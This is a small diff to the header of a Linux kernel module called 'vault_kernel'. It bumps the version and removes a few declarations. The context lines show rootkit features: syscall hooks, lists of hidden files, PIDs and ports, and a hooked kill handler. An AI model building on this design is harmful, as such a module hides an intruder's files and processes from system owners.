@@ -43,7 +43,7 @@
 
 /* -- Module metadata -- */
 #define VAULT_KERNEL_NAME    "vault_kernel"
-#define VAULT_KERNEL_VERSION "3.3"
+#define VAULT_KERNEL_VERSION "3.4"
 #define VAULT_KERNEL_AUTHOR  "ruby570bocadito"
 #define VAULT_KERNEL_TAG     "[vault_kernel]"
 
@@ -51,7 +51,6 @@
 #define CLASS_NAME       "vault_kernel"
 
 /* -- Syscall hook definitions -- */
-#define MAX_HOOKS        8
 #define MAX_HIDDEN_FILES 128
 #define MAX_HIDDEN_PIDS  64
 #define MAX_HIDDEN_PORTS 32
@@ -98,7 +97,7 @@
 #endif
 
 #if !defined(PTREGS_SYSCALL_STUBS) || !defined(CONFIG_X86_64)
-#  error "vault_kernel v3.1 requires an x86_64 kernel >= 4.17 (pt_regs syscall ABI)"
+#  error "vault_kernel requires an x86_64 kernel >= 4.17 (pt_regs syscall ABI)"
 #endif
 
 /* -- Hooked syscall entry -- */
@@ -169,7 +168,6 @@ void file_hide_del(const char *name);
 int file_hide_init(void);
 void file_hide_cleanup(void);
 void file_hide_reset(void);
-int is_file_hidden(const char *name);
 
 /* proc_hide.c */
 void proc_hide_add(int pid);
@@ -177,7 +175,6 @@ void proc_hide_del(int pid);
 int proc_hide_init(void);
 void proc_hide_cleanup(void);
 void proc_hide_reset(void);
-int is_pid_hidden(int pid);
 int is_proc_pid_hidden(const char *d_name);
 asmlinkage long hooked_kill(const struct pt_regs *regs);
 
